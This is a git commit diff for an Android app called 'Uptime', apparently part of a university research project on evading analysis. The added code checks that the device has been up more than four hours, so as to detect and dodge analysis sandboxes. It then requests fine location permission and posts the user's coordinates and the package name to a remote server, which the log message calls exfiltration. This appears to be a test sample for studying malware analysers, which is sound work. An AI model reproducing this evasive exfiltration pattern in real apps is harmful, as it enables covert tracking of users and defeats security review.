bcf9d5d783ae7983cc05aa8a821b5d4d0eb424fb
Timme Bethe <timme@timmebethe.nl>
2021-06-03 10:52:36 +0200

    Implemented actual leaking in Uptime
    - Updated all dependencies
    - Added leaking location

--- conditional-leaking/uptime/app/src/main/java/nl/tbethe/shadowdroid/uptime/MainActivity.kt
+++ conditional-leaking/uptime/app/src/main/java/nl/tbethe/shadowdroid/uptime/MainActivity.kt
@@ -1,9 +1,22 @@
 package nl.tbethe.shadowdroid.uptime
 
+import android.Manifest
+import android.content.pm.PackageManager
+import android.location.Criteria
+import android.location.LocationManager
 import androidx.appcompat.app.AppCompatActivity
 import android.os.SystemClock
 import android.os.Bundle
 import android.util.Log
+import androidx.activity.result.contract.ActivityResultContracts
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 private const val TAG = "MainActivity"
 
@@ -18,11 +31,53 @@ class MainActivity : AppCompatActivity() {
         // 4 hours = 1000 * 60 * 60 * 4 = 14_400_000
         val fourHourMillis : Long = 14_400_000
 
-//        Log.d(TAG, "Seconds since reboot : ${(millisSinceReboot / 1000 ).toInt()}")
+         leakLocationIf(millisSinceReboot > fourHourMillis)
+    }
 
-        if (millisSinceReboot > fourHourMillis) {
-            Log.d(TAG, "Leak data")
-            TODO("Leak data")
+    private fun leakLocationIf(notAnalyser: Boolean) {
+        if (!notAnalyser) return
+
+        fun sendLocation() {
+            val lm = getSystemService(LocationManager::class.java)
+            val provider = lm.getBestProvider(Criteria(), true)
+
+            val location = provider?.let {
+                lm.getLastKnownLocation(it)
+            }
+            location?.let { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("coords", "${loc.latitude}:${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }
+        }
+        val requestPermission =
+            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+                if (isGranted) sendLocation()
+            }
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
         }
     }
+
 }
